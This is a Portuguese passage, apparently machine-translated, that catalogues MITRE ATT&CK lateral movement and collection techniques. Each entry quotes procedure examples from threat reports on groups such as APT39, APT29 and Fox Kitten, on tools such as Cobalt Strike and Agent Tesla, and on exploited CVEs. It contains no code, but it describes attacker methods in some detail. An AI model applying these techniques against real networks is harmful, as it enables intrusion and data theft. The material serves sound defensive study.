**Exemplo de procedimento:** Kivars tem a capacidade de acionar remotamente a entrada do teclado e cliques do mouse. O KIVARS permitiu que os invasores baixassem e executassem arquivos, listassem unidades, desinstalassem o serviço de malware, tirassem capturas de tela, ativassem/desativassem keylogger, mostrassem/ocultassem janelas ativas e acionasse cliques do mouse e entradas de teclado. Uma versão de 64 bits do KIVARS também surgiu para acompanhar a popularidade dos sistemas de 64 bits. As capacidades do XBOW são derivadas de BIFROSE e KIVARS; Besta Envolta recebe seu nome a partir de seu formato único mutex.

**REFERÊNCIA:** https://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html

.001 **Remote Desktop Protocol:** Os adversários podem usar contas válidas para fazer login em um computador usando o Remote Desktop Protocol (REMOTE Desktop Protocol). O adversário pode, então, executar ações como usuário conectado. Os adversários podem se conectar a um sistema remoto via RDP/RDS para expandir o acesso se o serviço estiver ativado e permitir o acesso a contas com credenciais conhecidas.

**Exemplo de procedimento:** Dragonfly 2.0 moveu-se lateralmente via RDP:   Os atores de ameaças usaram as redes dos alvos de encenação como pontos de pivô e repositórios de malware ao atingir suas vítimas finais.

Detalhes técnicos

Os atores de ameaça nesta campanha empregaram uma variedade de TTPs, incluindo

- E-mails de spear-phishing (de conta legítima comprometida),
- Domínios de rega-buracos,
- Coleta de credenciais,
- Reconhecimento de código aberto e de rede,
- Exploração baseada em hospedeiro, e
- visando a infraestrutura do sistema de controle industrial (ICS).

**REFERÊNCIA:** https://www.cisa.gov/uscert/ncas/alerts/TA18-074A

.002 **Ações do administrador SMB/Windows:** O SMB é um protocolo de compartilhamento de portas em série para máquinas Windows na mesma rede ou domínio. Os adversários podem usar o SMB para interagir com os compartilhamentos de arquivos, permitindo que eles se movam lateralmente através de uma rede. Implementações linux e macOS de SMB normalmente usam Samba.

**Exemplo de procedimento:** APT39 tem usado SMB para movimento lateral. O grupo adicionou um novo método de infecção ao seu kit de ferramentas, usando documentos maliciosos que provavelmente são circulados usando e-mails de phishing enviados a indivíduos que trabalham em organizações direcionadas. Esses documentos eram planilhas do Excel. Quando abertos, eles baixaram um arquivo VBS malicioso que, por sua vez, executou um script PowerShell. Algumas horas depois, um conta-gotas apareceria no computador comprometido. Isso instalaria três arquivos no computador, um ladrão de informações, um utilitário de captura de tela e um executável vazio.  SMB: Usado em conjunto com outras ferramentas para atravessar redes de destino. Essas ferramentas incluem a exploração EternalBlue (que foi usada anteriormente por WannaCry e Petya).

**REFERÊNCIA:** https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/chafer-latest-attacks-reveal-heightened-ambitions

.003 **Modelo de objeto de componente distribuído:** O Com (Windows Component Object Model, modelo de objeto de componentes do Windows) é um componente da interface nativa de programação de aplicativos do Windows (API) que permite a interação entre objetos de software ou código executável que implementa uma ou mais interfaces.

**Exemplo de procedimento:** O Cobalt Strike pode fornecer cargas de farol para o movimento lateral, aproveitando a execução remota do COM: ma das características do COM é sua capacidade de instantanear objetos remotamente e chamar métodos sobre eles. Chamando este método remotamente, podemos fazer com que o sistema de destino execute um comando para carregar nosso agente na memória ou enfraquecer a configuração do alvo para outras opções pós-exploração. O Script agressor é a linguagem de script do Cobalt Strike para estender o cliente Cobalt Strike e adicionar bots ao seu engajamento. Facilitar a ação e o uso rápidos de novos TTPs do Cobalt Strike é um dos objetivos do Aggressor Script. Aqui está um script que adiciona um comando com-executivo ao Beacon. Este comando roteirizado é semelhante aos comandos psexec, psexec_psh, wmi e winrm existentes do Beacon para o movimento lateral.

![image](https://user-images.githubusercontent.com/95362045/161577957-361efb39-ba39-48ba-863d-5dbda2bc0b1a.png)

**REFERÊNCIA:** https://www.cobaltstrike.com/blog/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/

.004 **SSH:** SSH é um protocolo que permite que usuários autorizados abram conchas remotas em outros computadores. Muitas versões Linux e macOS vêm com SSH instalado por padrão, embora normalmente desativado até que o usuário o habili. O servidor SSH pode ser configurado para usar autenticação de senha padrão ou mensagens de chave público-privadas em vez de ou além de uma senha

**Exemplo de procedimento:** O APT39 facilita o movimento lateral através de inúmeras ferramentas como Remote Desktop Protocol (RDP), Secure Shell (SSH), PsExec, RemCom e xCmdSvc. Ferramentas personalizadas como REDTRIP, PINKTRIP e BLUETRIP também foram usadas para criar proxies SOCKS5 entre hosts infectados. Além de usar RDP para movimento lateral, o APT39 tem usado este protocolo para manter a persistência em um ambiente de vítima. Para completar sua missão, o APT39 normalmente arquiva dados roubados com ferramentas de compressão, como WinRAR ou 7-Zip.

**REFERÊNCIA:** https://www.mandiant.com/resources/apt39-iranian-cyber-espionage-group-focused-on-personal-information

.005 **VNC:** O VNC difere do Remote Desktop Protocol, pois o VNC é um software de compartilhamento de tela em vez de software de compartilhamento de recursos. Por padrão, o VNC usa a autenticação do sistema, mas pode ser configurado para usar credenciais específicas do VNC

**Exemplo de procedimento:** Os adversários podem abusar do VNC para executar ações maliciosas como o usuário conectado, como abrir documentos, baixar arquivos e executar comandos arbitrários. Um adversário poderia usar o VNC para controlar e monitorar remotamente um sistema para coletar dados e informações para girar para outros sistemas dentro da rede. Bibliotecas/implementações específicas do VNC também têm sido suscetíveis a ataques de força bruta e exploração do uso de memória.

**REFERÊNCIA:** https://www.crowdstrike.com/blog/carbon-spider-embraces-big-game-hunting-part-1/

.006 **Gerenciamento remoto do Windows:** WinRM é o nome de um serviço Windows e um protocolo que permite que um usuário interaja com um sistema remoto (por exemplo, execute um executável, modifique o Registro, modifique serviços). Ele pode ser chamado com o comando ou por qualquer número de programas, como o PowerShell.winrm O WinRM pode ser usado como um método de interagir remotamente com a Instrumentação de Gerenciamento do Windows.

**Exemplo de procedimento:** Threat Group-3390 usou o WinRM para permitir a execução remota: Atores reconfiguram recursos do windowns para estabelecer o PowerShell remoto e WinRM, para permitir uma gama completa de recursos de configuração, transferência de dados e execução remota atraveis de HTTP/HTTPS

**REFERÊNCIA:** https://www.secureworks.com/research/bronze-union

T1091 **Replicação através de mídia removível:** Os adversários podem passar para sistemas, possivelmente aqueles em redes desconectadas ou com falhas de ar, copiando malware para mídia removível e aproveitando os recursos do Autorun quando a mídia é inserida em um sistema e executa. No caso do Movimento Lateral, isso pode ocorrer através da modificação de arquivos executáveis armazenados em mídia removível ou copiando malware e renomeando-o para parecer um arquivo legítimo para enganar os usuários a executá-lo em um sistema separado.

**Exemplo de procedimento:** H1N1 tem funcionalidade para copiar-se para mídia removível: O fluxo de execução é dividido em segmentos com base no nome do processo de execução atual. Uma verificação é feita hashing o nome do processo de execução atual e comparando-o com o valor de 0x490A0972 (neste caso sendo explorador.exe). Esse valor foi encontrado como parte do vazamento da fonte carberp de 2013. Isso pode indicar a reutilização do código pelo autor do malware. Ao executar como Explorer.exe (de onde paramos em nossa aventura de desempacotar) tentará um bypass UAC, auto-delete, kill security services e auto-propagar através de compartilhamentos de rede e unidades USB.

**REFERÊNCIA:** https://blogs.cisco.com/security/h1n1-technical-analysis-reveals-new-capabilities-part-2

T1072 **Ferramentas de implantação de software:** Os adversários podem ter acesso e usar suítes de software de terceiros instaladas dentro de uma rede corporativa, como sistemas de administração, monitoramento e implantação, para se mover lateralmente através da rede. O acesso a um sistema de software de terceiros em toda a rede ou em toda a empresa pode permitir que um adversário tenha execução remota de código em todos os sistemas conectados a esse sistema. 

**Exemplo de procedimento:** O APT32 comprometeu o ePO da McAfee a se mover lateralmente distribuindo malware como uma tarefa de implantação de software: Em sua campanha atual, o APT32 aproveitou arquivos ActiveMime que empregam métodos de engenharia social para atrair a vítima para habilitar macros. Após a execução, o arquivo inicial downloads de várias cargas maliciosas de servidores remotos. Os atores APT32 continuam a fornecer os anexos maliciosos através de e-mails de phishing de lança.

Os atores APT32 projetaram documentos de isca multilíngue que foram adaptados para vítimas específicas. Embora os arquivos tivessem extensões de arquivo ".doc", as iscas de phishing recuperadas eram arquivos de páginas da Web do ActiveMime ".mht" que continham texto e imagens. Esses arquivos provavelmente foram criados exportando documentos do Word para páginas web de arquivo único.

**REFERÊNCIA:** https://www.mandiant.com/resources/cyber-espionage-apt32

T1080 **Conteúdo compartilhado de taint:** Os adversários podem fornecer cargas em sistemas remotos adicionando conteúdo a locais de armazenamento compartilhados, como unidades de rede ou repositórios de código interno. O conteúdo armazenado em unidades de rede ou em outros locais compartilhados pode ser manchado adicionando programas maliciosos, scripts ou código de exploração a arquivos válidos de outra forma.

**Exemplo de procedimento:** Ramsay pode se espalhar infectando outros arquivos executáveis portáteis em redes compartilhadas: Este vetor de ataque consiste em documentos maliciosos explorando CVE-2017-0199 destinados a abandonar uma versão mais antiga de Ramsay.  Este documento oferece um Script Básico Visual inicial, mostrado na captura de tela abaixo como OfficeTemporary.sct, que extrairá dentro do corpo do documento o agente Ramsay, mascarado como uma imagem JPG por ter um PE codificado base64 sob um cabeçalho JPG.

**REFERÊNCIA:** https://www.welivesecurity.com/2020/05/13/ramsay-cyberespionage-toolkit-airgapped-networks/

T1550 **Use material de autenticação alternativa:** Os adversários podem usar material de autenticação alternativa, como hashes de senha, bilhetes Kerberos e tokens de acesso de aplicativos, a fim de se mover lateralmente dentro de um ambiente e ignorar os controles normais de acesso ao sistema. O material de autenticação alternativa permite que o sistema verifique se uma identidade foi autenticada com sucesso sem pedir ao usuário que reinsiente nos fatores de autenticação.

**Exemplo de procedimento:** O APT29 usou tokens SAML falsificados que permitiam que os atores se passassem por usuários e ignorassem o MFA, permitindo que o APT29 acessasse aplicativos e serviços corporativos em nuvem.

**REFERÊNCIA:** https://www.microsoft.com/security/blog/2020/12/28/using-microsoft-365-defender-to-coordinate-protection-against-solorigate/

.001 **Token de acesso ao aplicativo:** Os adversários podem usar tokens de acesso de aplicativos roubados para contornar o processo típico de autenticação e acessar contas, informações ou serviços restritos em sistemas remotos. Esses tokens são normalmente roubados dos usuários e usados em vez de credenciais de login. Os tokens de acesso ao aplicativo são usados para fazer solicitações de API autorizadas em nome de um usuário e são comumente usados como uma maneira de acessar recursos em aplicativos baseados em nuvem e software-as-a-service (SaaS)

**Exemplo de procedimento:** O APT28 usou vários aplicativos maliciosos que abusaram de tokens de acesso da OAuth para obter acesso a contas de e-mail-alvo, incluindo Gmail e Yahoo Mail.

**REFERÊNCIA:** https://www.trendmicro.com/en_us/research/17/d/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks.html

.002 **Passe o Hash:**  Pass the hash (PtH) é um método de autenticação como usuário sem ter acesso à senha do texto claro do usuário. Este método ignora as etapas de autenticação padrão que requerem uma senha de texto claro, movendo-se diretamente para a parte da autenticação que usa o hash de senha.

**Exemplo de procedimento:** PoshC2 tem uma série de módulos que aproveitam passar o hash para movimento lateral: 

**REFERÊNCIA:** https://github.com/nettitude/PoshC2

.003 **Passe o Bilhete:** Os adversários podem "passar o bilhete" usando bilhetes Kerberos roubados para se mover lateralmente dentro de um ambiente, ignorando os controles normais de acesso ao sistema. Passe o bilhete (PtT) é um método de autenticação para um sistema que usa bilhetes Kerberos sem ter acesso à senha de uma conta. A autenticação kerberos pode ser usada como o primeiro passo para o movimento lateral para um sistema remoto.

**Exemplo de procedimento:** Algumas amostras do SeaDuke têm um módulo para usar passe o bilhete com Kerberos para autenticação: Os invasores controlam a Cozyduke através de sites comprometidos, emitindo instruções para máquinas infectadas enviando "tarefas" para um arquivo de banco de dados. A Cozyduke entrará em contato periodicamente com esses sites para recuperar informações de tarefas a serem executadas na máquina local. Uma dessas tarefas (um script PowerShell codificado) instruiu cozyduke a baixar e executar o Seaduke a partir de um site comprometido.

**REFERÊNCIA:** https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6ab66701-25d7-4685-ae9d-93d63708a11c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments

.004 **Cookie de sessão web:** Os adversários podem usar cookies de sessão roubados para autenticar em aplicativos e serviços da Web. Esta técnica contorna alguns protocolos de autenticação multifatorial, uma vez que a sessão já está autenticada. Cookies de autenticação são comumente usados em aplicativos web, incluindo serviços baseados em nuvem, depois que um usuário se autentica no serviço para que as credenciais não sejam aprovadas e a re autenticação não precise ocorrer com tanta frequência. 

**REFERÊNCIA:** https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/

TA0009 **COLEÇÃO:**  

Adversário está tentando reunir dados de interesse para seu objetivo.  A coleta consiste em técnicas que os adversários podem usar para coletar informações e as informações das fontes são coletadas de que são relevantes para seguir em frente os objetivos do adversário. Frequentemente, o próximo objetivo após a coleta de dados é roubar (exfiltrato) os dados. As fontes de destino comuns incluem vários tipos de unidade, navegadores, áudio, vídeo e e-mail. Os métodos comuns de coleta incluem captura de capturas de tela e entrada de teclado.

T1557 **Adversário no Meio:** Os adversários podem tentar se posicionar entre dois ou mais dispositivos em rede usando uma técnica adversária no meio (AiTM) para suportar comportamentos de acompanhamento, como o Sniffing de Rede ou a Manipulação de Dados Transmitidos. Os adversários podem aproveitar a posição AiTM para tentar modificar o tráfego, como na Manipulação de Dados Transmitidos. Os adversários também podem impedir que o tráfego flua para o destino apropriado, causando negação de serviço.

**Exemplo de procedimento:** Dok proxies tráfego web para potencialmente monitorar e alterar o tráfego HTTP(S) da vítima: Este maware instala um servidor proxy malicioso para o Man-in-the-Middle a fim de farejar as credenciais bancárias das vítimas e manipular o tráfego para obter acesso a contas financeiras.

**REFERÊNCIA:** https://objective-see.com/blog/blog_0x25.html#Dok

.001 **Envenenamento por LLMNR/NBT-NS e relé SMB:** Ao responder ao tráfego de rede LLMNR/NBT-NS, os adversários podem falsificar uma fonte autorizada de resolução de nomes para forçar a comunicação com um sistema controlado por adversários. Esta atividade pode ser usada para coletar ou retransmitir materiais de autenticação.

**Exemplo de procedimentos:**  Wizard Spider usou os cmdlets Invoke-Inveigh PowerShell, provavelmente para envenenamento por serviço de nome: O movimento lateral foi mais comumente realizado usando credenciais válidas em combinação com Cobalt Strike BEACON, RDP e SMB, ou usando os mesmos backdoors usados para estabelecer uma base nas redes das vítimas.

- Os atores têm regularmente aproveitado Cobalt Strike BEACON e Metasploit Meterpreter para se mover lateralmente dentro de ambientes de vítimas.

- Os atores geralmente se moviam lateralmente dentro de ambientes de vítimas usando contas comprometidas — tanto aquelas pertencentes a usuários regulares quanto contas com privilégios administrativos. Além do uso de estruturas comuns pós-exploração, o movimento lateral também foi alcançado usando comandos WMIC e os protocolos Windows RDP e SMB.

- Os atores usaram o comando de uso da rede do Windows para se conectar às ações administrativas do Windows para se mover lateralmente.

**REFERÊNCIA:** https://www.mandiant.com/resources/kegtap-and-singlemalt-with-a-ransomware-chaser

.002 **Envenenamento por cache ARP:** O protocolo ARP é usado para resolver endereços IPv4 para vincular endereços de camada, como um endereço MAC. Um adversário pode esperar passivamente por uma solicitação de ARP para envenenar o cache ARP do dispositivo solicitante. O adversário pode responder com seu endereço MAC, enganando assim a vítima, fazendo-a acreditar que está se comunicando com o dispositivo em rede pretendido.

**Exemplo de procedimento:** A primeira etapa no planejamento e implementação de um ataque de envenenamento ARP é a seleção de alvos. Pode ser um ponto de extremidade específico em uma rede, um grupo de pontos de extremidade ou um dispositivo de rede, como um roteador. Os roteadores são alvos atraentes porque o envenenamento ARP do roteador bem-sucedido pode interromper o tráfego de uma sub-rede inteira. Existem duas maneiras principais de envenenar o ARP: um invasor pode esperar por uma solicitação ARP para um alvo específico e responder a ela ou usar solicitações ARP gratuitas. A primeira resposta será menos visível na web, mas seu impacto potencial também será menor. As solicitações ARP autodirecionadas podem ser mais eficazes e afetar mais vítimas, mas têm a desvantagem de gerar muito tráfego de rede. Com qualquer uma das abordagens, um cache ARP corrompido nos dispositivos das vítimas pode ser usado para outros fins:

**REFERÊNCIA:** https://tech-pt.netlify.app/articles/pt562144/index.html#:~:text=O%20envenenamento%20por%20ARP%20%C3%A9,monitorar%20o%20tr%C3%A1fego%20de%20rede.

T1560 **Arquivar dados coletados:** Um adversário pode compactar e/ou criptografar dados coletados antes da exfiltração. A compressão dos dados pode ajudar a ofuscar os dados coletados e minimizar a quantidade de dados enviados pela rede. A criptografia pode ser usada para ocultar informações que estão sendo exfiltradas da detecção ou tornar a exfiltração menos visível após a inspeção por um defensor.

**Exemplo de procedimento:** O agente Tesla pode criptografar dados com 3DES antes de enviá-los para um servidor C2: 

**REFERÊNCIA:** https://www.youtube.com/watch?v=iGW5KlsZguI

.001 **Arquivamento via Utilitário:** Um adversário pode compactar ou criptografar dados coletados antes da exfiltração usando utilitários de terceiros. Existem muitos utilitários que podem arquivar dados, incluindo 7-Zip, WinRAR, e WinZip. A maioria dos utilitários inclui funcionalidade para criptografar e/ou comprimir dados.

**Exemplo de procedimento:** O APT3 usou ferramentas para compactar dados antes de exfilá-los.

**REFERÊNCIA:** https://blog.carnal0wnage.com/2012/09/more-on-aptsim.html

.002 **Arquivo via Biblioteca:** Um adversário pode compactar ou criptografar dados coletados antes da exfiltração usando bibliotecas de terceiros. Existem muitas bibliotecas que podem arquivar dados, incluindo python rarfile, libzip, e zlib. A maioria das bibliotecas inclui funcionalidade para criptografar e/ou comprimir dados.

**Exemplo de procedimento:** O malware do Lazarus Group IndiaIndia salva informações coletadas sobre a vítima para um arquivo que é compactado com Zlib, criptografado e carregado em um servidor C2

**REFERÊNCIA:** https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-RAT-and-Staging-Report.pdf

.003 **Arquivamento via Método Personalizado:** Um adversário pode compactar ou criptografar dados coletados antes da exfiltração usando um método personalizado. Os adversários podem optar por usar métodos de arquivamento personalizados, como criptografia com XOR ou cifras de fluxo implementadas sem referências externas de biblioteca ou utilitário. Implementações personalizadas de algoritmos de compressão bem conhecidos também foram usadas.

**Exemplo de procedimento:** Kimsuky usou criptografia RC4 antes de exfiltrar: Todos esses dados são mesclados em um arquivo xmlrwbin.inc, que é então criptografado com RC4. A chave RC4 é gerada como um hash MD5 de um buffer de 117 bytes gerado aleatoriamente. Para ser capaz de decifrar os dados, o invasor certamente deve saber o hash MD5 ou todo o conteúdo do buffer. Esses dados também são enviados, mas o RSA criptografado. O malware constrói uma chave pública de 1120 bits, usa-a para criptografar o buffer de 117 bytes.

**REFERÊNCIA:** https://securelist.com/the-kimsuky-operation-a-north-korean-apt/57915/

T1123 **Captura de audio:** Um adversário pode aproveitar os dispositivos periféricos de um computador (por exemplo, microfones e webcams) ou aplicativos (por exemplo, serviços de chamada de voz e vídeo) para capturar gravações de áudio com o propósito de ouvir conversas confidenciais para coletar informações.

**Exemplo de procedimento:** DarkComet pode ouvir as conversas das vítimas através do microfone do sistema:DARKCOMET (também conhecido como FYNLOS) é uma ferramenta de administração remota (RAT) que é usada em muitos ataques direcionados. Ele tem a capacidade de tirar fotos via webcam, ouvir conversas através de um microfone ligado a um PC, e ganhar controle total da máquina infectada.

Este RAT também é conhecido por sua funcionalidade de keylogging e transferência de arquivos. Como tal, qualquer invasor remoto pode carregar qualquer arquivo na máquina infectada ou até mesmo roubar documentos.

DARKCOMET rouba as seguintes informações:

- Direitos administrativos
- Nome do computador/usuário
- Língua/País
- Informações do Sistema Operacional
- RAM usado
- Informações do Web Cam
 Este backdoor modifica certas entradas de registro para desativar funções do Security Center. Fazer isso permite que esse malware execute suas rotinas sem ser    detectado. Ele desativa opções de gerenciador de tarefas, editor de registro e pasta. Ele modifica as entradas de registro para desativar as configurações do Firewall do Windows. Essa ação permite que esse malware execute suas rotinas sem ser detetado pelo Firewall do Windows.
 
 **REFERÊNCIA:** https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/DARKCOMET
 
 T1119 **Coleta Automatizada:** Uma vez estabelecido dentro de um sistema ou rede, um adversário pode usar técnicas automatizadas para coletar dados internos. Os métodos para executar essa técnica podem incluir o uso de um interpretador de comando e scripting para pesquisar e copiar critérios definidos de ajuste de informações, como tipo de arquivo, localização ou nome em intervalos de tempo específicos.
 
 **Exemplo de procedimento:** MESSAGETAP verifica dois arquivos, keyword_parm.txt e parm.txt, para obter instruções sobre como segmentar e salvar dados analisados e extraídos dos dados de mensagens SMS do tráfego de rede. Se uma mensagem SMS contivesse um número de telefone, número IMSI ou palavra-chave que correspondesse à lista predefinida, ela será salva em um arquivo CSV para roubo posterior pelo ator de ameaça
 
 **REFERÊNCIA:** https://www.mandiant.com/resources/messagetap-who-is-reading-your-text-messages
 
 T1185 **Sequestro de sessão do navegador:**  Os adversários podem aproveitar as vulnerabilidades de segurança e a funcionalidade inerente ao software do navegador para alterar conteúdo, modificar comportamentos do usuário e interceptar informações como parte de várias técnicas de sequestro de sessão de navegador.
 
 **Exemplo de procedimento:** Um exemplo específico é quando um adversário injeta software em um navegador que permite que eles herdem cookies, sessões HTTP e certificados de cliente SSL de um usuário e, em seguida, usam o navegador como uma maneira de pivotar em uma intranet autenticada.A execução de comportamentos baseados em navegador, como pivotação, pode exigir permissões específicas de processos, como e/ou direitos de alta integridade/administrador.
 
 **REFERÊNCIA:** https://www.bitdefender.com/blog/labs/oil-gas-spearphishing-campaigns-drop-agent-tesla-spyware-in-advance-of-historic-opec-deal/
 
 T1115 **Dados da área de transferência:** Os adversários podem coletar dados armazenados na área de transferência de usuários copiando informações dentro ou entre aplicativos. No Windows, os aplicativos podem acessar dados de área de transferência usando a API do Windows. O OSX fornece um comando nativo, para pegar o conteúdo da área de transferência.pbpaste
 
 **Exemplo de procedimento:** Agente Tesla pode roubar dados da prancheta da vítima:   o Agente Tesla tem a capacidade de roubar as informações de login do usuário de uma série de peças importantes de software, como Google Chrome, Mozilla Firefox, Microsoft Outlook e muitos outros. Ele também pode ser usado para capturar capturas de tela, gravar webcams e permitir que os invasores instalem malware adicional em sistemas infectados.
 
 **REFERÊNCIA:** https://blog.talosintelligence.com/2018/10/old-dog-new-tricks-analysing-new-rtf_15.html
 
 T1530 **Dados do Objeto de Armazenamento em Nuvem:** Os adversários podem acessar objetos de dados de armazenamento em nuvem protegido incorretamente
 
 **Exemplo de procedimento:** Fox Kitten obteve arquivos das instâncias de armazenamento em nuvem da vítima: . O ator de ameaças realiza varredura em massa e usa ferramentas, como o Nmap, para identificar portas abertas. Uma vez identificados os portas abertas, o ator de ameaças explora CVEs relacionados à infraestrutura de VPN para obter acesso inicial a uma rede direcionada. A CISA e o FBI observaram o ator de ameaças explorando vários CVEs, incluindo CVE-2019-11510, CVE-2019-11539, CVE-2019-19781 e CVE-2020-5902. Depois de obter acesso inicial a uma rede direcionada, o ator de ameaças obtém credenciais de nível de administrador e instala shells web permitindo um entrincheiramento adicional
 
 **REFERÊNCIA:** https://www.cisa.gov/uscert/ncas/alerts/aa20-259a
 
 T1602 **Dados do Repositório de Configuração:** Os adversários podem coletar dados relacionados a dispositivos gerenciados a partir de repositórios de configuração. Os repositórios de configuração são usados por sistemas de gerenciamento para configurar, gerenciar e controlar dados em sistemas remotos. Os repositórios de configuração também podem facilitar o acesso remoto e a administração de dispositivos.
 
 **Exemplo de procedimento:** Os adversários podem direcionar esses repositórios para coletar grandes quantidades de dados confidenciais de administração do sistema. Os dados dos repositórios de configuração podem ser expostos por vários protocolos e softwares e podem armazenar uma grande variedade de dados, muitos dos quais podem se alinhar com objetivos de Discovery adversários
 
 **REFERÊNCIA:** https://www.cisa.gov/uscert/ncas/alerts/TA18-106A
 
 .001 **SNMP (MIB Dump):** Os adversários podem direcionar a Base de Informações gerenciais (MIB) para coletar e/ou minerar informações valiosas em uma rede gerenciada usando o Simple Network Management Protocol (SNMP).
 
 **Exemplo de procedimento:** Os adversários podem usar consultas SNMP para coletar conteúdo MIB diretamente de dispositivos gerenciados pelo SNMP, a fim de coletar informações de rede que permitam ao adversário construir mapas de rede e facilitar a exploração direcionada futura 
 
**REFERÊNCIA:** https://www.cisa.gov/uscert/ncas/alerts/TA18-106A

.002 **Despejo de configuração do dispositivo de rede:** Os adversários podem acessar arquivos de configuração de rede para coletar dados confidenciais sobre o dispositivo e a rede. A configuração da rede é um arquivo que contém parâmetros que determinam o funcionamento do dispositivo.

**Exemplo de procedimento:** Os adversários podem usar ferramentas e protocolos de gerenciamento comuns, como O Protocolo simples de Gerenciamento de Rede (SNMP) e Smart Install (SMI), para acessar arquivos de configuração de rede

**REFERÊNCIA:** https://www.cisa.gov/uscert/ncas/alerts/TA18-106A

T1213 **Dados de repositórios de informações:** Os repositórios de informações são ferramentas que permitem o armazenamento de informações, normalmente para facilitar a colaboração ou o compartilhamento de informações entre os usuários, e podem armazenar uma grande variedade de dados que podem ajudar os adversários em objetivos adicionais ou acesso direto às informações de destino. Os adversários também podem abusar de recursos de compartilhamento externo para compartilhar documentos confidenciais com destinatários fora da organização.

**Exemplo de procedimento:**  A Fox Kitten acessou a segurança das vítimas e ambientes de TI e equipes da Microsoft para minerar informações valiosas: O ator de ameaças realiza varredura em massa e usa ferramentas, como o Nmap, para identificar portas abertas. Uma vez identificados os portas abertas, o ator de ameaças explora CVEs relacionados à infraestrutura de VPN para obter acesso inicial a uma rede direcionada. A CISA e o FBI observaram o ator de ameaças explorando vários CVEs, incluindo CVE-2019-11510, CVE-2019-11539, CVE-2019-19781 e CVE-2020-5902.Depois de obter acesso inicial a uma rede direcionada, o ator de ameaças obtém credenciais de nível de administrador e instala shells web permitindo um entrincheiramento adicional. Depois de estabelecer uma base, os objetivos do ator ameaça parecem estar mantendo a persistência e exfiltrando dados. Esse ator de ameaças foi observado vendendo acesso à infraestrutura de rede comprometida em um fórum de hackers online

**REFERÊNCIA:** https://www.cisa.gov/uscert/ncas/alerts/aa20-259a

.001 **Confluência:** Os adversários podem aproveitar os repositórios de Confluência para minerar informações valiosas. Frequentemente encontrada em ambientes de desenvolvimento ao lado da Atlassian JIRA, a Confluence é geralmente usada para armazenar documentação relacionada ao desenvolvimento, no entanto, em geral pode conter categorias mais diversas de informações úteis, tais como.

- Políticas, procedimentos e normas
- Diagramas de rede físico/lógico
- Diagramas de arquitetura de sistema
- Documentação do sistema técnico
- Credenciais de teste/desenvolvimento
- Horários de trabalho/projeto
- Trechos de código fonte
- Links para compartilhamentos de rede e outros recursos internos

.002 **Ponto de share:** Os adversários podem aproveitar o repositório SharePoint como uma fonte para minerar informações valiosas. O SharePoint muitas vezes conterá informações úteis para um adversário aprender sobre a estrutura e funcionalidade da rede interna e sistemas. Por exemplo, o seguinte é uma lista de informações de exemplo que podem conter valor potencial para um adversário e também podem ser encontradas no SharePoint:

- Políticas, procedimentos e normas
- Diagramas de rede físico/lógico
- Diagramas de arquitetura de sistema
- Documentação do sistema técnico
- Credenciais de teste/desenvolvimento
- Horários de trabalho/projeto
- Trechos de código fonte
- Links para compartilhamentos de rede e outros recursos internos

**Exemplo de procedimento:** Quimera coletou documentos do SharePoint da vítima: Esse adversário começa com a obtenção de nomes de usuário e senhas da vítima de violações anteriores. Essas credenciais são usadas em um recheio de credenciais ou spray de senha contra os serviços remotos da vítima, como webmail ou outros serviços de correio acessíveis à Internet. Após a obtenção de uma conta válida, eles usam essa conta para acessar a VPN, Citrix ou outro serviço remoto da vítima que permita o acesso à rede da vítima. As informações sobre esses serviços de controle remoto são retiradas da caixa de correio, unidade de nuvem ou outros recursos em nuvem acessíveis pela conta comprometida. 

**REFERÊNCIA:** https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/

.003 **Repositórios de código:** Os adversários podem aproveitar os repositórios de código para coletar informações valiosas. Repositórios de código são ferramentas/serviços que armazenam código-fonte e automatizam compilações de software. Eles podem ser hospedados interna ou privadamente em sites de terceiros, como Github, GitLab, SourceForge e BitBucket. Os usuários normalmente interagem com repositórios de código através de um aplicativo web ou utilitários de linha de comando, como o git.

**REFERÊNCIA:** https://msrc-blog.microsoft.com/2021/02/18/microsoft-internal-solorigate-investigation-final-update/

T1005 **Dados do Sistema Local:** Os adversários podem pesquisar fontes locais do sistema, como sistemas de arquivos ou bancos de dados locais, para encontrar arquivos de interesse e dados confidenciais antes da Exfiltração.

**Exemplo de procedimento:** O AppleSeed pode coletar dados em um host comprometido: Os adversários podem fazer isso usando um Interpretador de Comando e Scripting, como o CMD, que tem funcionalidade para interagir com o sistema de arquivos para coletar informações. Alguns adversários também podem usar o Automated Collection no sistema local. 

**REFERÊNCIA:** https://blog.malwarebytes.com/threat-intelligence/2021/06/kimsuky-apt-continues-to-target-south-korean-government-using-appleseed-backdoor/

T1039 **Dados da unidade compartilhada de rede:** Os adversários podem pesquisar compartilhamentos de rede em computadores que comprometeram para encontrar arquivos de interesse. Dados confidenciais podem ser coletados de sistemas remotos através de unidades de rede compartilhadas (diretório compartilhado do host, servidor de arquivos de rede, etc.) que são acessíveis do sistema atual antes da Exfiltração. Os projéteis de comando interativos podem estar em uso, e a funcionalidade comum dentro do CMD pode ser usada para coletar informações.

**Exemplo de procedimento:** BRONZE BUTLER exfiltra arquivos roubados de arquivos: Linha do tempo do malware usado pela BRONZE BUTLER

- Daserf — Este backdoor tem a funcionalidade de um shell remoto e pode ser usado para executar comandos, carregar e baixar dados, capturar capturas de tela e registrar teclas. Ele usa criptografia RC4 e codificação base64 personalizada para ofuscar o tráfego HTTP. Os pesquisadores da CTU identificaram duas versões de Daserf escritas em Visual C e Delfos. A análise dos timestamps do compilado sugerem que a versão Delphi é o sucessor da versão Visual C. A análise da CTU sugere que a seguinte entrada de registro é uma indicação de uma infecção das Daserf baseada em Delfos:

- Tecla: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer
Value: MMID = <random hexacle>

- Datper — BRONZE BUTLER provavelmente criou este RAT codificado por Delfos para substituir Daserf. O Datper usa uma configuração criptografada RC4 para ofuscar o tráfego HTTP.

